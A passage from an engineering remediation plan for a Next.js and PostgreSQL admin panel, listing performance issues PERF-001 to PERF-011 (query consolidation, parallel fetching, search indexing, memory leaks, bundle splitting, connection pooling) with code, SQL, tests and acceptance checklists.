1. Run the audit queries (§8.2 Q2, Q10) against the target database. **Requires production read access — mark Not Verified until run.**
2. For each duplicate pair, drop the redundant object **by name** in a `-- migrate:no-transaction` file with `DROP INDEX CONCURRENTLY IF EXISTS`.
3. Never drop an index that backs a unique constraint (`pg_constraint.conindid`); use `ALTER TABLE … DROP CONSTRAINT` instead, and only with approval.
4. Record the surviving index inventory in `docs/ai-context/DATABASE_CONTEXT.md` as the canonical list.
5. Extend `npm run db:parity` to compare the canonical list against both the migrations and Drizzle.

**Expected Behavior After Fix:**
One canonical index inventory, verified against the live database, mirrored in Drizzle, with unused indexes either justified or removed.

**Dependencies:**
- **Depends on** DB-002, DB-003, DB-006, DB-015.
- **Related** DB-004.

**Testing Requirements:**
- Audit queries executed; results recorded.
- Dropped indexes are not referenced by any query plan (checked with `EXPLAIN`).
- Parity script passes.
- Insert throughput measured before/after.

**Acceptance Criteria:**
- [ ] Audit executed (prerequisite documented).
- [ ] Redundant objects removed or justified.
- [ ] Canonical inventory documented.
- [ ] Parity script extended.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

## 6.4 Performance Issues

---

### PERF-001 — Root layout issues six database queries on every page render

**Priority:** P1
**Category:** Performance
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/layout.tsx
src/components/layout/app-shell.tsx
```

**Problem Description:**
The root layout is the single most-executed server component in the app: it renders for every route, including `/login` and every product/order/payment screen. It issues **six** queries — four scalar counters and two `LIMIT 3` notification lists — inside a `try/catch` that swallows every error. There is no request-scoped caching, so a navigation that triggers a server render plus a client navigation can execute them twice per page view.

**Current Implementation:**
`src/app/layout.tsx:55-135`:
```ts
const admin = await getCurrentAdmin();
if (admin) {
  const [ [pendingOrdersRow], [pendingPaymentsRow], [lowStockRow], [todaysRevenueRow],
          recentPayments, recentOrders ] = await Promise.all([
    db.select({…}).from(orders).where(sql`${orders.status} IN ('awaiting_payment','payment_submitted','pending')`),
    db.select({…}).from(payments).where(sql`${payments.status} = 'awaiting_verification'`),
    db.select({…}).from(inventory).where(sql`(${inventory.quantityOnHand} - ${inventory.quantityReserved}) <= ${inventory.reorderLevel}`),
    db.select({…}).from(orders).where(sql`date(${orders.createdAt}) = current_date AND ${orders.status} NOT IN ('cancelled','refunded')`),
    db.select({…}).from(payments).where(…).limit(3),
    db.select({…}).from(orders).where(…).limit(3),
  ]);
}
```
The four counters are independent scalar aggregates; the two lists are independent small fetches. This is six round trips to produce eight numbers and six strings.

**Root Cause:**
The layout was used as the only component guaranteed to see every route, so badge data was computed there ad hoc. No caching layer was introduced because the data must be fresh.

**Real-World Failure Scenario:**
Every navigation pays 6 queries × ~1–3 ms plus 6 round-trip latencies. On a Supabase pooler with 30 ms RTT that is ~180 ms of pure latency added to *every* page, including pages that do not display badges (e.g. the product edit form). Under concurrency, 6 queries per render × N concurrent admins consumes the 10-connection pool quickly (PERF-009).

**Required Implementation:**

1. Create `src/server/services/shell.service.ts` (or a repository function) exposing `getShellSummary(admin)` implementing **two** queries:
   ```sql
   SELECT
     (SELECT count(*) FROM orders WHERE status IN ('awaiting_payment','payment_submitted','pending')) AS pending_orders,
     (SELECT count(*) FROM payments WHERE status = 'awaiting_verification') AS pending_payments,
     (SELECT count(*) FROM inventory WHERE (quantity_on_hand - quantity_reserved) <= reorder_level) AS low_stock,
     (SELECT coalesce(sum(total),0) FROM orders
       WHERE (created_at AT TIME ZONE 'Asia/Karachi')::date = (now() AT TIME ZONE 'Asia/Karachi')::date
         AND status NOT IN ('cancelled','refunded')) AS todays_revenue;
   ```
   and one `UNION ALL` (or two parallel `LIMIT 3` queries) for notifications.
2. Wrap it with React `cache()` so multiple components in one render share the result:
   ```ts
   export const getShellSummary = cache(async (adminId: string) => { … });
   ```
   `cache()` is per-request only — it introduces **no staleness across requests** and is safe for live counters. Do **not** use `unstable_cache`/`revalidateTag` for these counters: they are cheap and must be live.
3. Keep the `try/catch`, but log the failure with context and continue with zeroed stats (current behaviour is acceptable; the silence is not — Rule 11).
4. Target: **≤ 2 queries per render**, measured with the §9.6 harness. Record before/after counts.
5. Do not change `AppShell`'s props or visuals.

**Expected Behavior After Fix:**
Any page render executes at most two queries for shell badges, once per request regardless of how many components read them. Badge values remain live.

**Dependencies:**
- **Related** BUG-034 (timezone + sequencing), PERF-002, PERF-009.

**Testing Requirements:**
- Query-count harness: `/products` render → ≤ 2 shell queries.
- Badge values equal direct SQL for the same moment.
- Two components reading the summary in one render → one execution.
- DB failure → page still renders with zeros and a log line.

**Acceptance Criteria:**
- [ ] Single combined counter query.
- [ ] Request-scoped `cache()`.
- [ ] ≤ 2 queries measured.
- [ ] Errors logged.
- [ ] No visual change.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-002 — Dashboard loads sequentially and then re-aggregates in the browser

**Priority:** P1
**Category:** Performance
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/page.tsx
src/views/Dashboard.tsx
```

**Problem Description:**
`src/app/page.tsx` performs five independent data fetches **sequentially**:
```ts
const ordersResult = await orderService.getOrders({ page: 1, limit: 100, … }, admin);
const orderMetrics = await orderService.getOrderMetrics(admin);
const inventorySummary = await inventoryService.getInventorySummary(admin);
const lowStockItemsResult = await inventoryService.getInventory({ status: "low", limit: 6 }, admin);
const [totalProductsRow] = await db.select({ count: count() }).from(products).where(isNull(products.deletedAt));
const [activeProductsRow] = await db.select({ count: count() }).from(products).where(and(…));
```
That is 5 round trips where 1 is possible, followed by downloading up to 100 orders (plus joins) whose only purpose is client-side chart aggregation (BUG-028).

**Current Implementation:**
`src/app/page.tsx:44-98` — the awaits are literally sequential. `orderService.getOrders` itself runs a count query plus a paged query plus image/aggregate follow-ups (see PERF-003).

**Root Cause:**
The page was migrated from a client view one fetch at a time; `await` was the path of least resistance and nothing forced parallelism.

**Real-World Failure Scenario:**
With 40 ms RTT and ~10 ms per query, the dashboard takes 5 × 50 ms ≈ 250 ms before rendering begins, plus hydration and client aggregation. Every navigation back to `/` repeats it.

**Required Implementation:**

1. Collapse into one `Promise.all([...])` for the genuinely independent calls:
   ```ts
   const [metrics, inventorySummary, lowStock, productCounts] = await Promise.all([
     orderService.getOrderMetrics(admin),
     inventoryService.getInventorySummary(admin),
     inventoryService.getInventory({ status: "low", limit: 6 }, admin),
     getProductCounts(),          // one query with two FILTER aggregates
   ]);
   ```
2. Do **not** fetch 100 orders. Remove `getOrders` from this page and replace it with the server-side bucket aggregate (BUG-028). If a "recent orders" widget exists in the design, fetch `limit: 5` in the same `Promise.all`.
3. Merge the two product-count queries into one:
   ```sql
   SELECT count(*) AS total, count(*) FILTER (WHERE status='active') AS active
   FROM products WHERE deleted_at IS NULL;
   ```
4. Target: **≤ 4 queries total** for the dashboard (metrics 1, inventory summary 1, low stock 1, buckets 1, product counts folded into metrics if convenient). Record the measured count.
5. Keep `export const dynamic = "force-dynamic"` (live operational data must not be statically cached).

**Expected Behavior After Fix:**
All dashboard data loads in one round-trip wall time, and the page no longer transfers order rows to draw charts.

**Dependencies:**
- **Depends on** BUG-028 (bucket aggregate) for the chart portion.
- **Related** PERF-001, PERF-003.

**Testing Requirements:**
- Wall-clock: parallel vs sequential measured on staging (record, do not invent).
- Query count ≤ 4.
- Payload size independent of order volume.
- All widgets render identical values to SQL.

**Acceptance Criteria:**
- [ ] All independent calls parallel.
- [ ] Product counts merged.
- [ ] No 100-row order fetch.
- [ ] Query target met and recorded.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-003 — Product listing runs five queries per page (count, page, categories, variants, images, stock)

**Priority:** P1
**Category:** Performance
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/product.repository.ts
```

**Problem Description:**
One product listing request executes, in sequence: (1) count, (2) paged product+category select, (3) a colours query, (4) a variants+inventory query, (5) an images query — each `inArray(productIds, …)` against the page's IDs. Every query is awaited separately (no `Promise.all`), so the latencies add.

**Current Implementation:**
`src/server/repositories/product.repository.ts:154-290`:
```ts
const [countResult] = await executor.select({…}).from(products).where(whereClause);      // 1
const matchedProducts = await executor.select({…}).from(products)
  .leftJoin(productCategories, …).where(whereClause).orderBy(…).limit(…).offset(…);      // 2
const productIds = matchedProducts.map(p => p.id);
// then (3) colours, (4) variants+inventory aggregate, (5) images — see the blocks
// that build `items` with stock, minPrice, primaryImage
```

**Root Cause:**
The "3-step" list strategy (page IDs → related rows) avoids N+1 but serialises the follow-ups. The count is also a separate full `COUNT(*)` over the same predicate.

**Real-World Failure Scenario:**
A 30 ms-RTT connection makes this ~150 ms per product page; with 20 concurrent admins, 100 queries in flight against a 10-connection pool causes queuing (PERF-009). The page feels sluggish even though each query is individually fast.

**Required Implementation:**

1. Parallelise the independent follow-ups:
   ```ts
   const [colors, variants, images] = await Promise.all([colorsQ, variantsQ, imagesQ]);
   ```
   This alone removes two round trips of wall time without changing SQL.
2. Fold the count into the page query with a window function:
   ```sql
   SELECT …, count(*) OVER() AS total_count FROM products … LIMIT $n OFFSET $m
   ```
   Removes one round trip. Handle the empty-page case by falling back to a separate count (or `total = offset` when zero rows and offset > 0).
3. Consider combining variants+inventory into a single aggregate query per product page (it already joins `inventory`), and images into the same statement via `json_agg` — target **2 queries** per listing (page+count, related aggregates) instead of 5. If `json_agg` complicates Drizzle typing, keep 3 parallel queries; either is a measured improvement over 5 serial.
4. Do not introduce caching for product stock (Safety Rule: no stale inventory).
5. Record before/after query counts with §9.6.

**Expected Behavior After Fix:**
A product listing page executes at most 2–3 queries, at least two of them concurrently.

**Dependencies:**
- **Related** BUG-014, BUG-015, PERF-004, PERF-009.

**Testing Requirements:**
- Query count for `/products` with 20 rows: ≤ 3.
- `total` from the window function matches a `COUNT(*)` for the same predicate.
- Page 0 / empty result edge cases correct.
- Response payload unchanged.

**Acceptance Criteria:**
- [ ] Follow-ups run in parallel.
- [ ] Count folded into the page query (or documented fallback).
- [ ] Query count ≤ 3.
- [ ] Total correctness verified.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-004 — Unbounded queries on coupons and customer aggregates

**Priority:** P1
**Category:** Performance
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/coupon.repository.ts
src/server/repositories/customer.repository.ts
```

**Problem Description:**
`CouponRepository.findPaginated` has no `LIMIT` (BUG-030) and materialises the whole table. `CustomerRepository.findPaginated` computes `ordersCount`, `totalSpend` and `lastOrderDate` by `LEFT JOIN orders` + `GROUP BY customers.id` for **every** customer before applying `LIMIT/OFFSET` — that part is bounded by the limit, but the aggregate join scans the customer's orders for each row, and the sort by `total_spend` (a computed alias) requires sorting the grouped set. With 20k orders the query does substantial work per page.

**Current Implementation:**
`src/server/repositories/customer.repository.ts:96-128`: one query with `leftJoin(orders, …)`, `groupBy(customers.id)`, `orderBy(orderExpr)`, `limit/offset`. `coupon.repository.ts:78-105`: no limit at all.

**Root Cause:**
Aggregate-in-list was chosen for simplicity; the composite indexes needed to make it cheap do not exist (DB-006).

**Real-World Failure Scenario:**
The customers page takes seconds once order volume grows; the coupons page allocates the whole table per request (BUG-030).

**Required Implementation:**

1. **Coupons:** fixed by BUG-030 (SQL `LIMIT/OFFSET/COUNT`). No separate work here — cross-reference.
2. **Customers:** keep the single grouped query but (a) add the supporting index `orders(customer_id, status, total, placed_at)` **only if** `EXPLAIN` shows it used, and (b) avoid sorting by a computed aggregate across the whole table when the sort is not required. Concretely:
   - Default sort (`createdAt`) must not require grouping. Use two queries: page the customers first (`ORDER BY created_at LIMIT/OFFSET`), then aggregate only those IDs (`WHERE customers.id IN (…)`). This turns the aggregate into a 20-row operation.
   - When sorting by `ordersCount`/`totalSpend`, grouping is unavoidable — keep it, but bound it with the same `LIMIT/OFFSET` and verify the planner uses a hash aggregate.
3. Cap `limit` at 100 via the existing Zod schema (already `max(100)`), and ensure the page passes the user's value rather than a hardcoded 100 (BUG-033).
4. Measure both paths with `EXPLAIN (ANALYZE, BUFFERS)` and record.

**Expected Behavior After Fix:**
Customer list pages issue bounded work proportional to the page size for the default sort; coupon list work is bounded by the page size.

**Dependencies:**
- **Depends on** BUG-030, BUG-033.
- **Related** DB-006, PERF-003.

**Testing Requirements:**
- 10k customers / 50k orders fixture: default sort page renders under a recorded budget; `EXPLAIN` shows index usage.
- Sort by spend still correct and bounded.
- Coupon page with 5k rows: one bounded query.

**Acceptance Criteria:**
- [ ] Default customer sort avoids whole-set grouping.
- [ ] Aggregate limited to the page's IDs.
- [ ] Coupon query bounded (BUG-030).
- [ ] Plans recorded.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-005 — Leading-wildcard `ILIKE` search cannot use indexes

**Priority:** P2
**Category:** Performance
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/repositories/product.repository.ts
src/server/repositories/order.repository.ts
src/server/repositories/customer.repository.ts
src/server/repositories/payment.repository.ts
```

**Problem Description:**
Every search builds `%term%` patterns, which no B-tree index can serve. Under `ILIKE '%x%'` PostgreSQL performs a sequential scan (plus `lower()` per row when case-insensitive). Four repositories do this, and the list pages can pass user input directly.

**Current Implementation:**
- `product.repository.ts:141-150`: `or(ilike(products.name, '%…%'), ilike(products.slug, …), ilike(products.description, …))`
- `order.repository.ts:111-124`: five `ilike` predicates across two tables
- `customer.repository.ts:60-70`: four `ilike` predicates
- `payment.repository.ts:80-90`: three `ilike` predicates

Additionally, user input is interpolated into the pattern without escaping `%` and `_`, so a search for `100%` matches far more than intended.

**Root Cause:**
Substring search was specified ("search anywhere in the name") and implemented with `ILIKE`, which cannot be indexed without an extension.

**Real-World Failure Scenario:**
At 20k products, each keystroke-triggered search scans the table. With BUG-033's client-side filtering this is masked today, but once search moves server-side (required by BUG-023/033) the scans become per-request.

**Required Implementation:**

1. **Escape wildcards** (correctness first):
   ```ts
   function likePattern(q: string) {
     return `%${q.trim().replace(/[\\%_]/g, (m) => `\\${m}`)}%`;
   }
   ```
   Use with `ilike(col, pattern)`.
2. **Choose an indexing strategy and document the decision:**
   - **(a) Prefix search:** change to `ILIKE 'term%'` and add `text_pattern_ops`/`lower()` indexes. Fast and index-backed, but changes UX (no infix match).
   - **(b) Trigram:** `CREATE EXTENSION IF NOT EXISTS pg_trgm;` + GIN indexes on `lower(name)`. Supports infix and is the correct answer for admin search — but requires an extension and a schema decision, so it must be an explicit, approved choice.
   - **(c) Keep `%term%`** and accept sequential scans, but only after measure-proof that the corpus is small.
   Recommendation in this plan: **(b)** for `products.name`, `customers.first_name/last_name/email`, `orders.order_number/contact_phone`; document that it is an infrastructure prerequisite (**extension may require a Supabase dashboard toggle — mark Not Verified until enabled**).
3. Restrict searchable columns to those indexed; drop `products.description` from the search predicate (it is the widest column and the least useful for an admin lookup) unless the product owner objects.
4. Add a minimum query length (2 chars) to avoid whole-table scans on single characters.
5. Measure `EXPLAIN` before/after. Do not claim numbers without running it.

**Expected Behavior After Fix:**
Search terms are matched literally (wildcards escaped), queries are bounded or index-backed per the chosen strategy, and results are predictable.

**Dependencies:**
- **Depends on** BUG-023/BUG-033 (search must actually reach the server first).
- **Related** DB-006, DB-016.

**Testing Requirements:**
- `q="100%"` returns only literal matches.
- `q="a"` → rejected or short-circuited by the minimum length.
- `EXPLAIN` for `q="scrub"` uses the chosen index (or documents the accepted scan).
- Search across all four entities returns correct rows.

**Acceptance Criteria:**
- [ ] Wildcards escaped.
- [ ] Strategy chosen and documented.
- [ ] Minimum length enforced.
- [ ] Plans recorded.
- [ ] Extension requirement flagged as a prerequisite.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-006 — List pages transfer and render more than they show

**Priority:** P2
**Category:** Performance
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/*/page.tsx
src/views/*.tsx
```

**Problem Description:**
Every list page ships 100 fully-mapped DTO rows into a client component, which then sorts, filters and slices them. The serialised payload crosses the RSC boundary, is parsed in the browser, and stays in memory for the lifetime of the page. Of those 100 rows, 10–20 are displayed.

**Current Implementation:**
`limit: 100` on six pages (BUG-033) and `useState(initialProducts)` retaining the whole array; `filtered`/`sorted`/`visible` memos derive the slice.

**Root Cause:**
Same as BUG-033 — the client owns pagination, so it needs the superset.

**Real-World Failure Scenario:**
A product row DTO includes variants, images and category — roughly 0.5–2 KB serialised. 100 rows is 50–200 KB per navigation, parsed on the main thread, for 20 visible rows. On a modest office laptop this is a visible delay and an unnecessary memory footprint on mobile tethering.

**Required Implementation:**

1. Resolved by BUG-033: with server pagination the page fetches exactly `limit` rows (default 20) and the payload shrinks proportionally.
2. Once paginated, additionally trim the list DTO to what the table renders (no `description`, no full variant matrix — `toProductListItemDTO` already synthesises a single variant; verify it is not also sending the real matrix).
3. Do not add virtualisation — unnecessary at 20 rows (Safety Rule 8).
4. Measure the serialised payload size of `/products` before and after with the browser network panel and record both.

**Expected Behavior After Fix:**
Each list navigation transfers only the rows it renders.

**Dependencies:**
- **Depends on** BUG-033.
- **Related** PERF-003.

**Testing Requirements:**
- Payload size before/after recorded.
- Visible rows identical.
- No additional client-side work on load.

**Acceptance Criteria:**
- [ ] Page size honoured end-to-end.
- [ ] List DTO trimmed.
- [ ] Payload measured.
- [ ] No visual change.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-007 — Object URL previews leak memory

**Priority:** P1
**Category:** Performance
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/components/shared/image-upload.tsx
```

**Problem Description:**
`URL.createObjectURL(file)` is called for every upload preview and never revoked. Each blob URL pins the entire file in memory until the document unloads. The previews also remain in `pendingUploads` after success unless explicitly cleared (verify the success path removes them — it marks `status: "success"` and keeps the item).

**Current Implementation:**
`src/components/shared/image-upload.tsx:160`:
```ts
newPendingItems.push({ …, previewUrl: URL.createObjectURL(file), … });
```
No `URL.revokeObjectURL` anywhere in the file (`grep -n "revokeObjectURL" src/` → no matches). The preview is used to render the thumbnail while uploading.

**Root Cause:**
Object URLs were treated as ordinary strings. They are handles that must be released.

**Real-World Failure Scenario:**
An admin uploads 40 product photos at 4 MB each in a long editing session across several products. 160 MB of blob data stays resident; the tab slows and can crash. Because the admin panel is used for hours, this accumulates rather than resetting.

**Required Implementation:**

1. Revoke the URL as soon as the preview is no longer needed:
   - On successful upload: revoke after the thumbnail switches to the remote `thumbnailUrl`.
   - On error: revoke immediately.
   - On component unmount: revoke every remaining pending preview.
2. Implement a small helper inside the component:
   ```ts
   const pendingPreviewUrls = useRef<Set<string>>(new Set());
   const createPreview = (file: File) => {
     const url = URL.createObjectURL(file);
     pendingPreviewUrls.current.add(url);
     return url;
   };
   const releasePreview = (url?: string) => {
     if (!url) return;
     URL.revokeObjectURL(url);
     pendingPreviewUrls.current.delete(url);
   };
   useEffect(() => () => { pendingPreviewUrls.current.forEach(URL.revokeObjectURL); pendingPreviewUrls.current.clear(); }, []);
   ```
3. Track the URL on the `PendingUpload` record so it can be revoked precisely (`previewUrl` already exists — use it).
4. Remove successfully-uploaded entries from `pendingUploads` once their result is committed to the parent's `value`, so the list does not grow unbounded during a session.

**Expected Behavior After Fix:**
Blob URLs are released within a few hundred ms of upload completion; memory stays flat across a long editing session.

**Dependencies:** None. **Related** SEC-006/SEC-007 (same component).

**Testing Requirements:**
- Upload 20 files: monitor `performance.memory` (Chromium) — memory returns to baseline after completion.
- Cancel mid-upload → URL revoked.
- Unmount during upload → all URLs revoked.
- Previews still render while uploading.

**Acceptance Criteria:**
- [ ] Every created URL is revoked exactly once.
- [ ] Unmount cleanup implemented.
- [ ] Completed uploads leave no pending entries.
- [ ] Preview UX unchanged.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-008 — `recharts` and `framer-motion` are loaded on every route

**Priority:** P2
**Category:** Performance
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Dashboard.tsx
src/components/ui/toast.tsx
src/app/layout.tsx
```

**Problem Description:**
`recharts` (~90–120 KB min+gzip depending on imports) is imported at module scope by `src/views/Dashboard.tsx`, which is a client component. `framer-motion` is imported by `src/components/ui/toast.tsx`, which is mounted by the root `Providers` on **every** page. Neither is needed outside its own surface.

**Current Implementation:**
`src/views/Dashboard.tsx:17` imports `AreaChart`, `BarChart`, etc. from `recharts` at top level. `src/components/ui/toast.tsx:4` imports `AnimatePresence, motion` from `framer-motion`; `src/components/providers.tsx` mounts `ToastProvider` globally.

**Root Cause:**
Static imports with no route-level code splitting beyond what Next.js does per page. The toast provider is global by design, so its dependency graph is global too.

**Real-World Failure Scenario:**
Every employee on every page downloads the charting library and the animation library before the page becomes interactive, on connections where 200 KB is seconds.

**Required Implementation:**

1. **Dashboard charts:** dynamically import the chart component with `next/dynamic` and `ssr: false`:
   ```tsx
   const RevenueChart = dynamic(() => import("@/components/dashboard/revenue-chart"), {
     ssr: false, loading: () => <ChartSkeleton />,
   });
   ```
   Extract the `recharts` usage into `src/components/dashboard/revenue-chart.tsx` so the import boundary is real. Keep the existing visuals exactly.
2. **Toast animation:** replace `framer-motion` in `toast.tsx` with CSS transitions/keyframes (Tailwind `animate-in`-style classes or a hand-written `@keyframes` in `globals.css`). This removes an entire dependency from the critical path — and if no other file uses `framer-motion` (verified: only `toast.tsx`), remove the package (ARCH-007).
3. Measure the first-load JS for `/` and `/products` before and after with `next build` output. Record actual numbers.
4. Do not lazy-load anything else speculatively.

**Expected Behavior After Fix:**
`/products` (and every non-dashboard page) no longer loads `recharts` or `framer-motion`. The dashboard loads charts after first paint.

**Dependencies:**
- **Related** ARCH-007 (dependency removal).

**Testing Requirements:**
- `next build` route table shows reduced First Load JS for non-dashboard routes.
- Dashboard charts render identically (screenshot comparison).
- Toasts still animate and remain accessible (`role="status"`).

**Acceptance Criteria:**
- [ ] `recharts` loaded only by the dashboard chunk.
- [ ] `framer-motion` no longer in the global bundle.
- [ ] Visual parity.
- [ ] Bundle sizes recorded.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-009 — Connection pool of 10 is per instance and easily exhausted

**Priority:** P1
**Category:** Performance
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/db/index.ts
src/app/layout.tsx
```

**Problem Description:**
`src/db/index.ts` configures `postgres(connectionString, { prepare: false, max: 10, idle_timeout: 20, connect_timeout: 10, max_lifetime: 1800 })`. The client is a module-level singleton — correct — but with `max: 10` **per Node process**, and every page render holding a connection for the duration of its queries (six in the layout plus page queries), the pool is saturated at roughly 3–5 concurrent admins on slow queries.

**Current Implementation:**
`src/db/index.ts:47-65` (singleton via `globalThis` in dev, fresh per process in prod). `prepare: false` is correct for Supavisor transaction mode (ADR 007).

**Root Cause:**
`max: 10` was chosen as a conservative default without relating it to (a) instance count, (b) Supavisor pool size, or (c) per-request query count.

**Real-World Failure Scenario:**
Three admins open the dashboard simultaneously; each render issues 6 (layout) + 5 (page) = 11 queries. With queries waiting on each other inside transactions (`FOR UPDATE`), a few concurrent order approvals can hold connections for hundreds of milliseconds. Additional requests queue for connections and eventually hit `connect_timeout: 10` → `INTERNAL_SERVER_ERROR` under exactly the load that matters.

**Required Implementation:**

1. **Measure first.** Record `pg_stat_activity` connection counts and `postgres.js` pool wait behaviour under a realistic concurrent load test (see §9.6). Do not change `max` without evidence.
2. Make the pool configurable and documented:
   ```ts
   max: Number(process.env.DATABASE_POOL_MAX ?? 10),
   ```
   and document the formula in `docs/ai-context/DATABASE_CONTEXT.md`:
   `instances × DATABASE_POOL_MAX ≤ Supavisor pool size − reserved`.
   **Requires hosting configuration access — mark Not Verified until the Supavisor pool size is known.**
3. Reduce **hold time** rather than raising the limit: PERF-001 (≤2 shell queries) and PERF-002/PERF-003 (parallel, fewer queries) cut per-request connection occupancy by ~60% without touching `max`. Prioritise these.
4. Ensure transactions are short: no external I/O inside `db.transaction` (SEC-009 already requires ImageKit deletes post-commit; verify no other network calls exist inside a transaction — `grep` for `fetch(`/`imagekit.` inside service transaction bodies).
5. Add a health metric endpoint or log line reporting pool size, active and waiting counts (`client.options` / postgres.js exposes queue length indirectly; if not available, log query durations and rely on `pg_stat_activity`).
6. Do **not** switch to a different driver or add pgbouncer config in this issue.

**Expected Behavior After Fix:**
Pool occupancy per request drops because requests issue fewer, parallel queries; `max` is a documented, tunable value tied to the hosting pool size; connection waits are observable.

**Dependencies:**
- **Depends on** PERF-001, PERF-002, PERF-003 (they reduce occupancy).
- **Related** ADR 007.

**Testing Requirements:**
- Load test with 10 concurrent admins: no `connect_timeout`, no queued request > recorded budget.
- `pg_stat_activity` peak connections recorded before/after.
- Transaction duration measured for `approvePayment` (must be < 500 ms on staging).
- No external call inside a transaction (static check).

**Acceptance Criteria:**
- [ ] Pool config documented and env-tunable.
- [ ] Occupancy reduced via query consolidation.
- [ ] Load test recorded.
- [ ] No external I/O inside transactions.
- [ ] Supavisor limit documented as a prerequisite.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-010 — Invalid remote image URLs crash `next/image`

**Priority:** P2
**Category:** Performance
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
next.config.ts
src/components/shared/image-upload.tsx
src/views/Products.tsx
src/views/ProductView.tsx
```

**Problem Description:**
`next.config.ts` restricts `images.remotePatterns` to `ik.imagekit.io`. The uploader accepts any URL string (`handleAddManualUrl`, `image-upload.tsx:287-306` — no validation), and product images may therefore point at any host. Rendering such a URL through `next/image` throws at runtime: `Invalid src prop … hostname "example.com" is not configured under images`.

**Current Implementation:**
`next.config.ts:5-13` — a single remote pattern. `image-upload.tsx` `handleAddManualUrl` accepts `trimmed` unvalidated. Product list/detail render with `next/image` (0 raw `<img>` tags remain — verified `grep '<img '` → 0).

**Root Cause:**
The image pipeline assumes all images are ImageKit-hosted, while the form permits arbitrary URLs.

**Real-World Failure Scenario:**
An admin pastes a supplier's image URL and saves. The products list throws while rendering that row — because the error occurs in a client component during render, the boundary catches it and the **entire list** shows "Something went wrong", blocking access to all products until the row is fixed.

**Required Implementation:**

1. Validate the URL at entry (BUG-021 step 2) and reject non-`https` and non-allowlisted hosts with a clear message.
2. Defensively handle legacy rows: a small helper `isAllowedImageHost(url)` used before passing to `next/image`; if not allowed, render a neutral placeholder with a tooltip rather than throwing.
3. Keep `remotePatterns` minimal (`ik.imagekit.io`) — do **not** widen it to `**` (that would defeat the optimisation proxy and create an SSRF/abuse surface).
4. Add an error boundary at the *row* level if the list continues to fail as a whole — or, preferably, ensure no throw is possible by step 2.

**Expected Behavior After Fix:**
Only allowlisted image hosts are rendered through `next/image`; invalid URLs degrade to a placeholder and never take down a page.

**Dependencies:**
- **Depends on** BUG-021 (URL validation).
- **Related** SEC-014, SEC-010 (`img-src` CSP).

**Testing Requirements:**
- Product with an external image URL → placeholder, page renders, no console error.
- Valid ImageKit URL → optimised image.
- New URL entry with an external host → rejected at the form.
- `next.config.ts` unchanged except any needed `pathname` refinement.

**Acceptance Criteria:**
- [ ] Invalid hosts never reach `next/image`.
- [ ] Placeholder path implemented.
- [ ] No page-level crash from one bad row.
- [ ] `remotePatterns` not widened.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### PERF-011 — Product edit form re-renders the entire matrix on every keystroke

**Priority:** P3
**Category:** Performance
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/ProductForm.tsx
```

**Problem Description:**
`ProductForm.tsx` is a single 1,600-line client component holding product basics, colours, variants, images and dialogs in one render tree. Any keystroke in the basics form (react-hook-form state) re-renders the whole component, including the variant matrix (which can contain 30+ rows) and the uploader.

**Current Implementation:**
`src/views/ProductForm.tsx` — `useForm` for basics plus `useState` for `colors`, `variants`, `images` all in the same component; no `memo`, no split. `grep -n "React.memo\|useMemo" src/views/ProductForm.tsx` shows `useMemo` only for `slugPrefix`.

**Root Cause:**
The form grew organically from a simple form into a full matrix editor inside one component.

**Real-World Failure Scenario:**
Editing the product name on a 6-colour × 5-size product produces visible input lag on a mid-range laptop (~30 rows × several inputs re-rendering per keystroke).

**Required Implementation:**

1. Extract three presentational children: `ColorEditor`, `VariantMatrix`, `ImagePanel`, each wrapped in `React.memo` and receiving **only** the props they need plus stable callbacks (`useCallback`).
2. Keep all state in the parent (no new state management library — Safety Rule 8). Pass `setVariants`-style updaters or narrow callbacks.
3. Use `react-hook-form`'s uncontrolled inputs for the basics form (already the case) and avoid watching values that the matrix depends on.
4. Do not change any UI markup, labels or layout.
5. Measure with the React DevTools profiler: record render counts for the matrix during a 10-keystroke edit, before and after.

**Expected Behavior After Fix:**
Typing in the basics form does not re-render the variant matrix or image panel.

**Dependencies:** None. **Related** BUG-018/BUG-019/BUG-021 (same file — coordinate to avoid conflicts).

**Testing Requirements:**
- Profiler: matrix renders 0 times during basics typing.
- All edits still persist (functional regression suite for the form).
- No visual diff.

**Acceptance Criteria:**
- [ ] Three memoised children.
- [ ] Callbacks stable.
- [ ] Render counts recorded.
- [ ] Functional parity.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
